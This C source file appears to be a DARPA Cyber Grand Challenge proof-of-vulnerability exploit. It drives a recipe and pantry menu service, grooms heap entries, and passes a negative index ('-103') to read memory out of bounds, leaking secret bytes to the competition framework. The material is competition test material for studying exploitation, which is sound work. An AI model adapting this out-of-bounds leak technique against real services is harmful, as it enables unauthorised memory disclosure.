/*

Author: John Berry <hj@cromulence.com>

Copyright (c) 2015 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/
#include <libcgc.h>

unsigned int ReadBytes(int fd, char *buf, unsigned int len) {
	unsigned int total_bytes = 0;
	size_t rx_bytes;
	char c;

	while (total_bytes < len) {
		if (receive(fd, &c, 1, &rx_bytes) != 0) {
			return(0);
		}
		if (rx_bytes == 0) {
			return(0);
		}
		buf[total_bytes++] = c;
	}

	return(total_bytes);
}

unsigned int ReadUntil(int fd, char delim, char *buf, unsigned int maxlen) {
	unsigned int total_bytes = 0;
	size_t rx_bytes;
	char c;

	while (total_bytes < maxlen-1) {
		if (receive(fd, &c, 1, &rx_bytes) != 0) {
			return(0);
		}
		if (rx_bytes == 0) {
			return(0);
		}
		if (c == delim) {
			break;
		}
		buf[total_bytes++] = c;
	}
	buf[total_bytes] = '\0';

	return(total_bytes);
}

unsigned int SendBytes(int fd, char *buf, unsigned int len) {
	size_t tx_bytes;
	unsigned int total_bytes = 0;

	while (total_bytes < len) {
		if (transmit(fd, buf+total_bytes, 1, &tx_bytes) != 0) {
			return(0);
		}
		if (tx_bytes != 1) {
			return(0);
		}
		total_bytes++;
	}

	return(total_bytes);
}

unsigned int pov_strlen(char *buf) {
	unsigned int len = 0;
	while (*(buf+len) != '\0') {
		len++;
	}
	return(len);
}

unsigned int SendString(int fd, char *buf) {
	unsigned int len = 0;

	return(SendBytes(fd, buf, pov_strlen(buf)));
}

void NegotiateType2Pov(unsigned int *type2_addr, unsigned int *type2_size, unsigned int *type2_length) {
	unsigned int PovType = 2;

	// Request Type 2 negotitation
	if (SendBytes(3, (char *)&PovType, 4) != 4) {
		_terminate(-1);
	}

	// get the 4-byte value for type2_addr
	if (ReadBytes(3, (char *)type2_addr, 4) != 4) {
		_terminate(-1);
	} 
	// get the 4-byte value for type2_size
	if (ReadBytes(3, (char *)type2_size, 4) != 4) {
		_terminate(-1);
	} 
	// get the 4-byte value for type2_length
	if (ReadBytes(3, (char *)type2_length, 4) != 4) {
		_terminate(-1);
	} 

	return;

}

int strncmp( char *pDest, char *pSrc, size_t nbytes)
{
        int index = 0;

        while ( pDest[index] && pSrc[index]  && index < nbytes) {
                if ( pDest[index] != pSrc[index] ) {
                        break;
                }

                index++;
        }

        if ( index == nbytes ) {
                index--;
        }

        return (pDest[index] - pSrc[index]);
}

char *strstr( char *str, char *sub, size_t maxlen ) 
{
	size_t index = 0;
	size_t stlen = 0;

	if ( str == NULL || sub == NULL || maxlen == 0 ) {
		return NULL;
	}

	stlen = pov_strlen( sub );

	while ( index < ( maxlen - ( stlen-1)  ) ) {
		if ( str[index] == sub[0] ) {
			if ( strncmp( str + index, sub, stlen ) == 0 ) {
				return str + index;
			}
		} 

		index++;
	}

	return NULL;
}

unsigned int ReadUntilString(int fd, char *sub, char *buf, unsigned int maxlen) {
	unsigned int total_bytes = 0;
	size_t rx_bytes;
	char c;
	size_t stlen = 0;
	size_t index = 0;

	stlen = pov_strlen( sub );

	while (total_bytes < maxlen-1) {
		if (receive(fd, &c, 1, &rx_bytes) != 0) {
			return(0);
		}
		if (rx_bytes == 0) {
			return(0);
		}

		buf[total_bytes++] = c;

		if ( sub[index] == c ) {
			index++;
		} else if ( sub[0] == c ) {
			index = 1;
		}

		if ( index == stlen ) {
			buf[total_bytes] = '\0';
			return total_bytes;
		}
	}
	buf[total_bytes] = '\0';

	return 0;
}

void addpantry( char *name )
{
	char buf[500];

	SendString( 0, "1\n");
	ReadUntilString(0, ": ", buf, 500);
	SendString(0, name);
	ReadUntilString(0, ": ", buf, 500);
	SendString(0, "\n");

	return;
}

void redo(void)
{
	char buf[5000];

	// Read the rest of the menu
	ReadUntilString( 0, "-> ", buf, 500);

	// Leave the menu
	SendString(0, "7\n");

	// Read the main menu
	ReadUntilString( 0, "-> ", buf, 500);

	// Enter the pantry menu
	SendString(0, "2\n");

	// Read the pantry menu
	ReadUntilString( 0, "-> ", buf, 500);

	// Delete a pantry
	SendString(0, "2\n");

	// Read all of the pantry list and then the prompt
	ReadUntilString( 0, "128]: ", buf, 5000);

	// Delete the 8th entry
	SendString(0, "7\n");

	/// Read the pantry menu again
	ReadUntilString( 0, "-> ", buf, 500);

	// Create a new pantry
	SendString(0, "1\n");

	// Read the pantry prompt
	ReadUntilString( 0, ": ", buf, 500);

	// Send the name
	SendString(0, "gggg\n");

	// Read the ingredient prompt
	ReadUntilString( 0, ": ", buf, 500);

	// Send blank
	SendString(0, "\n");

	// Read the pantry menu
	ReadUntilString( 0, "-> ", buf, 500);

	// Leave the pantry menu
	SendString(0, "6\n");

	// Read the main menu
	ReadUntilString( 0, "-> ", buf, 500);

	// Enter the recipe menu
	SendString( 0, "1\n");

	// Read the recipe menu
	ReadUntilString( 0, "-> ", buf, 500);

	return;
}

int main(void) {
	unsigned int type2_addr = 0;
	unsigned int type2_size = 0;
	unsigned int type2_length = 0;
	char buf[5000];
	char secret_buf[100];
	unsigned int i;
	unsigned int index = 0;
	unsigned int found = 0;

	char out[21];

	for ( i = 0; i < 100; i++) {
		secret_buf[i] = '\x00';
	}

	// negotiate a Type2 POV with the Competition Framework
	NegotiateType2Pov(&type2_addr, &type2_size, &type2_length);

	/// Read main menu
	ReadUntilString( 0, "-> ", buf, 500);
	SendString(0, "2\n");


	ReadUntilString( 0, "-> ", buf, 500);
	addpantry( "a\n");
	ReadUntilString( 0, "-> ", buf, 500);
	addpantry( "b\n");
	ReadUntilString( 0, "-> ", buf, 500);
	addpantry( "c\n");
	ReadUntilString( 0, "-> ", buf, 500);
	addpantry( "d\n");
	ReadUntilString( 0, "-> ", buf, 500);
	addpantry( "e\n");
	ReadUntilString( 0, "-> ", buf, 500);
	addpantry( "f\n");
	ReadUntilString( 0, "-> ", buf, 500);
	addpantry( "gggggggggggggg\n");
	ReadUntilString( 0, "-> ", buf, 500);
	addpantry( "hhhhhhhhhhhhhh\n");
	ReadUntilString( 0, "-> ", buf, 500);
	SendString(0, "6\n");
	ReadUntilString( 0, "-> ", buf, 500);
	SendString(0, "1\n");
	ReadUntilString( 0, "-> ", buf, 500);

	found = 0;

	while ( !found ) {
		// Print single name
		SendString(0, "5\n");
		ReadUntilString( 0, ": ", buf, 500);
		SendString(0, "-103\n");
		ReadBytes( 0, buf, 13);
		ReadBytes( 0, buf, 10);

		index = -1;
		// Check that the read worked and that there wasn't a null
		for ( i = 0; i < 4; i++) {
			/// If the value is "\n1" then assume that the read failed
			if ( buf[i] == 0x0a && buf[i+1] == '1') {
				index = i;
				break;
			}
		}

		/// Delete the offending pantry and add it back
		if ( index != -1 ) {
			redo();
		} else {
			// send the bytes to the competition framework
			SendBytes(3, (char*)(buf), 4);
			found = 1;
		}
	}

	_terminate( 0 );
}
